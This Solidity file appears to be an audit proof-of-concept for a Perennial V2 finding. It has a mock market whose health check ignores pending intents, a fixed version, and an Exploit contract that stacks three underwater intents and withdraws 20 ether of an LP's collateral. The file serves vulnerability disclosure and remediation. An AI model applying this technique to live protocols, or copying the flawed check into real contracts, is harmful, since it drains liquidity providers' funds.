// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Perennial V2 — H-1 (Sherlock 2025-01, issue 28)
    InvariantLib.validate adds only the intent being submitted. Three intents
    at 120 against an oracle of 100 each look like -20 on 40 of collateral.
    Together they are -60. Settlement leaves the taker at -20 and pays the
    maker 60. The extra 20 is the LP's collateral.
*/

contract Cash {
    string public symbol = "CASH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Market {
    struct Intent {
        address taker;
        address maker;
        int256 amount;
        int256 price;
    }

    Cash public cash;
    int256 public oraclePrice = 100 ether;
    mapping(address => int256) public collateral;
    Intent[] public intents;

    constructor(Cash _cash) {
        cash = _cash;
    }

    function deposit(address account, uint256 amount) external {
        cash.transferFrom(msg.sender, address(this), amount);
        collateral[account] += int256(amount);
    }

    /// validate from InvariantLib — only the guarantee passed in this call.
    function validate(address account, int256 amount, int256 price) public view returns (int256 health) {
        int256 pnl = amount * (oraclePrice - price) / 1 ether;
        // @> VULN: health adds only this intent's price gap and ignores every other pending intent
        health = collateral[account] + pnl;
        require(health >= 0, "health");
    }

    function submit(address taker, address maker, int256 amount, int256 price) external {
        validate(taker, amount, price);
        intents.push(Intent(taker, maker, amount, price));
    }

    function pending() external view returns (uint256) {
        return intents.length;
    }

    function settle() external {
        uint256 n = intents.length;
        for (uint256 i = 0; i < n; i++) {
            Intent memory intent = intents[i];
            int256 pnl = intent.amount * (oraclePrice - intent.price) / 1 ether;
            collateral[intent.taker] += pnl;
            collateral[intent.maker] -= pnl;
        }
        delete intents;
    }

    function withdraw(address account) external returns (uint256 amount) {
        int256 c = collateral[account];
        require(c > 0, "none");
        amount = uint256(c);
        collateral[account] = 0;
        cash.transfer(msg.sender, amount);
    }
}

contract MarketFixed {
    struct Intent {
        address taker;
        address maker;
        int256 amount;
        int256 price;
    }

    Cash public cash;
    int256 public oraclePrice = 100 ether;
    mapping(address => int256) public collateral;
    mapping(address => int256) public pendingPnl;
    Intent[] public intents;

    constructor(Cash _cash) {
        cash = _cash;
    }

    function deposit(address account, uint256 amount) external {
        cash.transferFrom(msg.sender, address(this), amount);
        collateral[account] += int256(amount);
    }

    function validate(address account, int256 amount, int256 price) public view returns (int256 health) {
        int256 pnl = amount * (oraclePrice - price) / 1 ether;
        health = collateral[account] + pendingPnl[account] + pnl;
        require(health >= 0, "health");
    }

    function submit(address taker, address maker, int256 amount, int256 price) external {
        validate(taker, amount, price);
        int256 pnl = amount * (oraclePrice - price) / 1 ether;
        pendingPnl[taker] += pnl;
        intents.push(Intent(taker, maker, amount, price));
    }
}

contract Exploit {
    Cash public cash;
    Market public market;
    address public taker = address(0x7A4E4);
    address public lp = address(0x190);
    int256 public healthEach;
    uint256 public submitted;
    int256 public takerAfter;
    int256 public makerAfter;
    uint256 public withdrawn;

    constructor() {
        cash = new Cash();
        market = new Market(cash);
        cash.mint(address(this), 100 ether);
        cash.approve(address(market), type(uint256).max);
        market.deposit(lp, 60 ether);
    }

    function run() external {
        market.deposit(taker, 40 ether);
        healthEach = market.validate(taker, 1 ether, 120 ether);
        market.submit(taker, address(this), 1 ether, 120 ether);
        market.submit(taker, address(this), 1 ether, 120 ether);
        market.submit(taker, address(this), 1 ether, 120 ether);
        submitted = market.pending();
        market.settle();
        takerAfter = market.collateral(taker);
        makerAfter = market.collateral(address(this));
        withdrawn = market.withdraw(address(this));
        require(healthEach == 20 ether, "health");
        require(submitted == 3, "three");
        require(takerAfter == -20 ether, "taker");
        require(makerAfter == 60 ether, "maker");
        require(withdrawn == 60 ether, "withdraw");
        require(cash.balanceOf(address(this)) == 60 ether, "stole 20");
    }
}
